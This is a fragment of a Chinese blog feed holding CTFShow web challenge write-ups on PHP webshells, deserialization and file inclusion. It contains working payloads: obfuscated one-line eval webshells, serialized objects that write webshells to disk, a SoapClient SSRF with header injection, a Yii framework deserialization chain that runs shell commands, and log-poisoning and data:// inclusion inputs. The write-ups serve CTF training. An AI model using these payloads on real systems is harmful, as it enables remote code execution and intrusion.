class="language-none">&lt;?php$a&#x3D;strrev(&#39;metsys&#39;);$a($_REQUEST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;$_REQUEST[&#39;a&#39;];$b&#x3D;$_REQUEST[&#39;b&#39;];$a($b);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow反序列化</title>
      <link href="/posts/17329.html"/>
      <url>/posts/17329.html</url>
      
        <content type="html"><![CDATA[        <h1 id="反序列化"   >          <a href="#反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1>      <p>序列化的概念：把一个对象转为字符串</p><p>序列化的好处：</p><p>1、有利于数据存储</p><p>2、方便数据传递</p><p>序列化后字符串的格式</p><pre class="line-numbers language-none"><code class="language-none">Public属性序列化后格式：成员名Private属性序列化后格式：%00类名%00成员名Protect属性序列化后格式：%00*%00成员名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>O:对象类名长度:”对象类名”:对象属性个数{属性名类型:属性名长度:”属性名字”;属性类型:属性长度:”属性内容”}</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PHP</span>序列化与反序列化方法：<span class="token number">1</span>、__construct 当一个对象被创建时调用<span class="token number">2</span>、__destruct 当一个对象被销毁时调用<span class="token number">3</span>、__toString 当一个对象被当作一个字符串时使用<span class="token number">4</span>、__sleep 在对象被序列化之前运行<span class="token number">5</span>、__wakeup 在对象被反序列化之后调用__construct<span class="token comment">// 触发条件，构造函数，当构造一个对象时调用。</span><span class="token comment">// 对象创建时销毁</span>__destruct<span class="token comment">// 触发条件，析构函数，对象销毁时被调用。</span><span class="token comment">// 序列化时会销毁一次，对象销毁时执行，序列化输出前运行，但不影响序列化内容</span>__unserialize<span class="token comment">// 触发条件，7.4版本以上，反序列化时出发，且可以绕过__wakeup</span>__sleep<span class="token comment">// 在对象被序列化之前运行</span>__wakeup<span class="token comment">// 在对象被反序列化之后被调用</span>__invoke<span class="token comment">// 当对象被调用时执行</span><span class="token comment">// 函数形式调用对象时，触发的方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>254</strong></p><pre class="line-numbers language-none"><code class="language-none">payload:?username&#x3D;xxxxx&amp;password&#x3D;xxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按照题中全等于直接构造即可</p><p><strong>255-257</strong></p><p>构造就行</p><p><strong>258</strong></p><p>过滤了<code>O:数字</code>的形式，在冒号后加+即可，URLdecode会自动解析成连接的</p><p><strong>259</strong></p><p>什么玩意跳过了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//flag.php$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);array_pop($xff);$ip = array_pop($xff);if($ip!=='127.0.0.1')&#123;die('error');&#125;else&#123;$token = $_POST['token'];if($token=='ctfshow')&#123;file_put_contents('flag.txt',$flag);&#125;&#125;//index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vip can get flag one key</span><span class="token variable">$vip</span><span class="token operator">-></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>灰溜溜的回来看WP</p><pre class="line-numbers language-none"><code class="language-none">如果调用一个没有定义的方法，那么就会使用类本身的call方法。由于给了个ssrf的代码，那么河里推断这是一个ssrf的原生类。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;PHP中原生类class SoapClient &#123;    &#x2F;* Methods *&#x2F;    public __construct(?string $wsdl, array $options &#x3D; [])    public __call(string $name, array $args): mixed    public __doRequest(        string $request,        string $location,        string $action,        int $version,        bool $oneWay &#x3D; false    ): ?string    public __getCookies(): array    public __getFunctions(): ?array    public __getLastRequest(): ?string    public __getLastRequestHeaders(): ?string    public __getLastResponse(): ?string    public __getLastResponseHeaders(): ?string    public __getTypes(): ?array    public __setCookie(string $name, ?string $value &#x3D; null): void    public __setLocation(?string $location &#x3D; null): ?string    public __setSoapHeaders(SoapHeader|array|null $headers &#x3D; null): bool    public __soapCall(        string $name,        array $args,        ?array $options &#x3D; null,        SoapHeader|array|null $inputHeaders &#x3D; null,        array &amp;$outputHeaders &#x3D; null    ): mixed&#125;&#x2F;&#x2F;可以得知构造SoapClient的类对象的时候，需要有两个参数，字符串$wsdl和数组$options<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">在构造SoapClient类时，传入数组参数为：array('uri'=>'http://链接','location'=>'http://链接/文件','user_agent'=>'UA头')该类的__call方法可构造请求使其对指定URL发起POST请求所以构造该类代码如下<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token variable">$ua</span><span class="token operator">=</span><span class="token string double-quoted-string">"ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow"</span><span class="token punctuation">;</span>   <span class="token comment">/*相当于构造出以下请求   User-Agent: ctfshow   x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1   Content-Type:application/x-www-form-urlencoded   Content-Length:13      token=ctfshow   */</span>   <span class="token comment">//由于Content-Length已经确定，所以后面该类自行构造的请求头失效</span>   <span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'location'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span><span class="token variable">$ua</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>260</strong></p><p>就输入那串字符就行</p><p><strong>261</strong></p><p>知识点：在7.4以上版本反序列化会绕过__wakeup()函数</p><p>$this-&gt;code==0x36d是弱类型比较，0x36d又有没有打引号，所以代表数字877，构造时使用877开头的文件即可，最终构造内容如下</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php   class ctfshowvip&#123;      public $username&#x3D;&quot;877.php&quot;;      public $password&#x3D;&quot;&lt;?php eval(\$_POST[&#39;kkk&#39;]);?&gt;&quot;;  &#x2F;&#x2F;这里记得转译，不然会让你传入kkk参数的      public $code;   &#125;   $s&#x3D;new ctfshowvip();   echo serialize($s);?&gt;&#x2F;&#x2F;无语Windows Defence把我文件删了😅<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>262</strong></p><p>简单轻松解法：</p><p>在message.php中直接构造token=admin的类</p><p>困难学习解法：</p><p><strong>263</strong></p><p>菜狗直接wp</p><p>首先看</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;index.php$_SESSION[&#39;limti&#39;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#39;limit&#39;]&#x3D;base64_decode($_COOKIE[&#39;limit&#39;]);&#x2F;&#x2F;明显limti写错了，所以这个代码永远执行的是$_SESSION[&#39;limit&#39;]&#x3D;base64_decode($_COOKIE[&#39;limit&#39;]);&#x2F;&#x2F;所以我们就可以控制session中的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>知识点：session在存储时有两种形式，一种是php，一种是php_serialize</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpclass user&#123;      public $name&#x3D;&quot;jlan&quot;;      public $pass&#x3D;&quot;123456&quot;;  &#125;$s&#x3D;new user();&#x2F;&#x2F;php存储：user|O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;jlan&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&#x2F;&#x2F;php_serialize存储：a:1:&#123;s:4:&quot;user&quot;;O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;jlan&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现诡异的点了吗，在php存储中，｜是用来分离变量名和序列化后的内容的，所以只要我们构造出序列化好的内容并且在前面加｜就可以让程序进行自动反序列化</p><p>继续查看inc/inc.php</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;inc&#x2F;inc.phpclass User&#123;    public $username;    public $password;    public $status;    function __construct($username,$password)&#123;        $this-&gt;username &#x3D; $username;        $this-&gt;password &#x3D; $password;    &#125;    function setStatus($s)&#123;        $this-&gt;status&#x3D;$s;    &#125;    function __destruct()&#123;        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#39;Y-m-d H:i:s&#39;));    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中包含<code>file_put_contents</code>函数可进行一句话木马的写入</p><p>最终构造如下</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class User&#123;    public $username&#x3D;&quot;1.php&quot;;    public $password&#x3D;&quot;&lt;?php eval(\$_POST[&#39;kkk&#39;]);phpinfo();?&gt;&quot;;    public $status&#x3D;&#39;1&#39;;&#125;$s&#x3D;new User();echo base64_encode(&#39;|&#39;.serialize($s));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先修改cookie访问主页，然后访问/check.php使得木马文件被写入，最后访问/log-1.php即可</p><p>264</p><p><strong>265</strong></p><p>地址传参</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpclass ctfshowAdmin&#123;   public $token;   public $password;   public function __construct()&#123;       $this-&gt;token&#x3D;&#39;a&#39;;       $this-&gt;password &#x3D; &amp;$this-&gt;token;&#125;&#125;$a&#x3D;new ctfshowAdmin();echo serialize($a);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>266</strong></p><p>匹配抛出异常后__destrurt不触发，所以使用大小写绕过即可</p><p><strong>267</strong></p><p>yii框架的反序列化漏洞，利用的类</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">yii\db\BatchQueryResult    public function __destruct()    &#123;        &#x2F;&#x2F; make sure cursor is closed        $this-&gt;reset();    &#125;    public function reset()    &#123;        if ($this-&gt;_dataReader !&#x3D;&#x3D; null) &#123;            $this-&gt;_dataReader-&gt;close();        &#125;        $this-&gt;_dataReader &#x3D; null;        $this-&gt;_batch &#x3D; null;        $this-&gt;_value &#x3D; null;        $this-&gt;_key &#x3D; null;    &#125;这里的$this-&gt;_dataReader内容可控，可以调用不存在close方法并且存在__call方法的类，全局搜索__call方法后，发现在yii\vendor\fzaninotto\faker\src\Faker\Generator.php    public function __call($method, $attributes)    &#123;        return $this-&gt;format($method, $attributes);    &#125;跟进format    public function format($formatter, $arguments &#x3D; array())    &#123;        return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);    &#125;跟进getFormatter    public function getFormatter($formatter)    &#123;        if (isset($this-&gt;formatters[$formatter])) &#123;            return $this-&gt;formatters[$formatter];        &#125;        foreach ($this-&gt;providers as $provider) &#123;            if (method_exists($provider, $formatter)) &#123;                $this-&gt;formatters[$formatter] &#x3D; array($provider, $formatter);                return $this-&gt;formatters[$formatter];&#x2F;&#x2F;这里会返回传入的$formatter的值            &#125;        &#125;        throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));    &#125;发现format方法中的call_user_func_array的第一个参数可控，想要利用进而查找调用了call_user_func函数的无参方法。发现了IndexAction.php中的run方法yii\rest\IndexAction.php    public function run()    &#123;        if ($this-&gt;checkAccess) &#123;            call_user_func($this-&gt;checkAccess, $this-&gt;id);        &#125;        return $this-&gt;prepareDataProvider();    &#125;在run方法中checkAccess和id都可控，利用链构造成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用链</p><p><code>yii\db\BatchQueryResult::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">poc<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow文件包含</title>
      <link href="/posts/5550.html"/>
      <url>/posts/5550.html</url>
      
        <content type="html"><![CDATA[        <h1 id="文件包含"   >          <a href="#文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1>      <p>常见的文件包含漏洞函数：include()，require()</p>        <h3 id="本地包含"   >          <a href="#本地包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3>              <h4 id="利用方式："   >          <a href="#利用方式：" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h4>              <h6 id="1、php-input："   >          <a href="#1、php-input：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1、php-input：" class="headerlink" title="1、php://input："></a>1、php://input：</h6>      <pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;input请求体内为PHP代码：&lt;?php phpinfo(); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input，同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p><p>遇到file_get_contents()要想到用php://input绕过。</p><span id="more"></span>        <h6 id="2、php-filter："   >          <a href="#2、php-filter：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2、php-filter：" class="headerlink" title="2、php://filter："></a>2、php://filter：</h6>      <pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;rescource&#x3D;xxx.php以base64编码读取?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</p>        <h6 id="3、zip-："   >          <a href="#3、zip-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3、zip-：" class="headerlink" title="3、zip://："></a>3、zip://：</h6>      <pre class="line-numbers language-none"><code class="language-none">?file&#x3D;zip:&#x2F;&#x2F;[压缩包绝对路径]#[压缩包内文件]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p><ul><li>zip://中只能传入绝对路径。</li><li>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23</li><li>只需要是zip的压缩包即可，后缀名可以任意更改。</li><li>相同的类型的还有zlib://和bzip2://</li></ul>        <h6 id="4、data-："   >          <a href="#4、data-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4、data-：" class="headerlink" title="4、data://："></a>4、data://：</h6>      <pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;[&lt;MIME-type&gt;][;cherset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;下面为示例?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>        <h6 id="5、phar-："   >          <a href="#5、phar-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#5、phar-：" class="headerlink" title="5、phar//："></a>5、phar//：</h6>      <pre class="line-numbers language-none"><code class="language-none">?file&#x3D;phar:&#x2F;&#x2F;压缩包路径（相对绝对都可）&#x2F;压缩包内文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要phar://有点类似zip://同样可以导致任意代码执行。<del>未来的我补一句，这玩意还是乖乖用来反序列化比较好</del></p>        <h4 id="可供包含的内容："   >          <a href="#可供包含的内容：" class="heading-link"><i class="fas fa-link"></i></a><a href="#可供包含的内容：" class="headerlink" title="可供包含的内容："></a>可供包含的内容：</h4>              <h6 id="1、包含Apache日志文件："   >          <a href="#1、包含Apache日志文件：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1、包含Apache日志文件：" class="headerlink" title="1、包含Apache日志文件："></a>1、包含Apache日志文件：</h6>              <h6 id="条件：对日志文件可读并且知道日志文件的存储目录"   >          <a href="#条件：对日志文件可读并且知道日志文件的存储目录" class="heading-link"><i class="fas fa-link"></i></a><a href="#条件：对日志文件可读并且知道日志文件的存储目录" class="headerlink" title="条件：对日志文件可读并且知道日志文件的存储目录"></a><strong>条件：对日志文件可读并且知道日志文件的存储目录</strong></h6>      <p><strong>注意事项：</strong>一般情况下日志存储目录被修改，需要读取服务器配置文件（httpd，conf，nginx，conf…）或者根据phpinfo()中的信息来得知。还有就是日志记录的信息都可以被调整，比如记录报错的等级或者内容格式。</p><p>Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。</p><p>如果访问一个不存在的资源时，如<span class="exturl"><a class="exturl__link"   href="http://www.xxxx.com/" >http://www.xxxx.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<?php phpinfo(); ?> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。</p><p>可以放在User-Agent中</p>        <h6 id="2、包含SESSION"   >          <a href="#2、包含SESSION" class="heading-link"><i class="fas fa-link"></i></a><a href="#2、包含SESSION" class="headerlink" title="2、包含SESSION"></a>2、包含SESSION</h6>      <p><strong>条件：</strong>找到Session内的可控变量，并且Session文件可读写，并且知道存储路径，PHP中SESSION文件保存路径可以在phpinfo中看到</p><p><strong>常见路径：</strong></p><p>/var/lib/php/sess_PHPSESSID<br>/tmp/sess_PHPSESSID<br>/tmp/sessions/sess_PHPSESSID<br>session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</p>        <h6 id="3、包含-pros-self-environ"   >          <a href="#3、包含-pros-self-environ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3、包含-pros-self-environ" class="headerlink" title="3、包含/pros/self/environ"></a>3、包含/pros/self/environ</h6>      <p><strong>内容：</strong>proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。</p><p><strong>条件：</strong>php以cgi方式运行，这样environ才会保持UA头。environ文件存储位置已知，且environ文件可读。</p>        <h6 id="4、包含临时文件"   >          <a href="#4、包含临时文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#4、包含临时文件" class="headerlink" title="4、包含临时文件"></a>4、包含临时文件</h6>      <p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\Winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p><p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p><p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>        <h5 id="78"   >          <a href="#78" class="heading-link"><i class="fas fa-link"></i></a><a href="#78" class="headerlink" title="78"></a>78</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>无过滤直接伪协议读取flag</p>        <h5 id="79"   >          <a href="#79" class="heading-link"><i class="fas fa-link"></i></a><a href="#79" class="headerlink" title="79"></a>79</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;eval($_POST[&#39;cmd&#39;]);?&gt;POSTcmd&#x3D;system(&#39;cat flag.php&#39;);payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了php，可使用data协议，通过再传入一个参数来执行命令，也可base64解码出想执行的命令</p>        <h5 id="80"   >          <a href="#80" class="heading-link"><i class="fas fa-link"></i></a><a href="#80" class="headerlink" title="80"></a>80</h5>      <pre class="line-numbers language-none"><code class="language-none">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logHEADERUser-Agent&#x3D;&lt;?php eval($_POST[[&#39;cmd&#39;]]);?&gt;POSTcmd&#x3D;system(&#39;cat fl0g.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了data，可通过包含日志来执行命令</p>        <h5 id="81"   >          <a href="#81" class="heading-link"><i class="fas fa-link"></i></a><a href="#81" class="headerlink" title="81"></a>81</h5>      <pre class="line-numbers language-none"><code class="language-none">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logHEADERUser-Agent&#x3D;&lt;?php eval($_POST[[&#39;cmd&#39;]]);?&gt;POSTcmd&#x3D;system(&#39;cat fl0g.php&#39;);<span aria-hidden="true" 